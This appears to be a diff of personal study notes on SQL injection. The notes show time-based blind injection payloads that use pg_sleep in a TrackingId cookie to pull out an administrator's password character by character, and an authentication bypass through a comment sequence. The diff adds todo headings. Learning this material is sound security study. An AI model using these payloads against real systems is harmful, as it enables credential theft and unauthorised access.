@@ -99,11 +99,14 @@ let's say we have a *cookie* called `TrackingId` and the *database is PostgreSQL
 > - **first character**: `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
 > - **2nd**: `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,2,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
 > - and so on ...
+##  out-of-band (OAST) techniques
+#todo
 # Subverting application logic
 
 ## simple attack 
 `SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'` 
 => submit username as `administrator'--` -> `SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`
-# ## Second-order SQL injection 
+# in different context 
+#todo
+# Second-order SQL injection 
 #todo 
-/git
